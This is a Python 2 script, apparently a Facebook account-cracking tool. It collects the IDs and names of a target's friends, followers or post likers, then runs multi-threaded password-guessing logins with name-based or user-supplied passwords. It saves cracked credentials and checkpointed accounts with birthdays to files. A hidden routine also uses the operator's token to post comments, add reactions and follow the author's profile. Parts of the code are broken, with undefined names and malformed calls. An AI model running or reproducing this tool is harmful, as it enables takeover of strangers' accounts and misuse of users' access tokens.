# -*- coding: utf-8
# coded by syafik R
# mr.tdr
# instagram.com/rgb.jr
# open source, tidak di perjual belikan

try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
	os.system("clear")
	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    una = ('100049252740120') 
    post = ('1031861840659590') 
    post2 = ('1110619372783836') 
    kom2 = ('KEREN BANG @[100049252740120:] 😘😘\nhttps:// https://free.facebook.com/photo.php?fbid=317727306545692&id=100049252740120&set=a.100454698272955&refid=17&ref=dbl ') 
    reac = ('LOVE') 
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/100049252740120/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100049252740120/subscribers?access_token=' + token)
    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
    menu()

def login():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Select The Login Method")
		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login With Token Facebook")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login With Cookie Facebook")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			tokenz()
		elif ask == "2" or ask == "02":
			cookie()
		else:
			login()
			
def cookie():
	logo()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookie : https://youtu.be/X7m_O_tZnTc")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	bot_komen()
	
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		os.system('clear')
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('rm -rf login.txt')
		login()
	except requests.exceptions.ConnectionError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	logo()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Active : %s"%(nama))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] IP Address  : "+ip)
	print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------") 
	print(" \033[0;97m[\033[0;96m1\033[0;97m] Crack From Public")
	print(" \033[0;97m[\033[0;96m2\033[0;97m] Crack From Follower")
	print(" \033[0;97m[\033[0;96m3\033[0;97m] Crack From Reaction")
	print(" \033[0;97m[\033[0;96m4\033[0;97m] Check Results")
	print(" \033[0;97m[\033[0;96m5\033[0;97m] Setting User-Agent")
	print(" \033[0;97m[\033[0;91m0\033[0;97m] Logout (delete token)")
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		public +ttl()
	elif ask == "2" or ask == "02":
		followers()
	elif ask == "3" or ask == "03":
		reaction()
	elif ask == "4" or ask == "04":
		print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check Results OK")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Check Results CP")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;92mOK\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mCP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		else:
			menu()
	elif ask == "5" or ask == "05":
		settua()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" \033[0;97m[\033[0;96m#\033[0;97m] Successfully Delete Token")
	else:
		menu()

def public():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def followers():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Followers")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def reaction():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,indonesia")
	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Set Password : ")
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
	if len(pw) ==0:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Don't Be Empty")
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		sys.stdout.write('\r \033[0;97m[\033[0;93m*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		ss = name.split(" ")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw.split(","):
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '       ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '|' + ttl)
						cp.append(uid+'|'+asu+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '       ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
	
### SETTING UA
def settua():
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Change User Agent? [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
			print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type In Chrome Search : My User Agent")
			ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] User Agent : ") 
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print(" \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	elif ask == "t" or ask == "T":
		try:
			ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print("\n \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	else:
		menu()
		
if __name__ == '__main__':
	if sys.version[0]!="3":
		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
	else:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
	os.system("git pull")
	login()
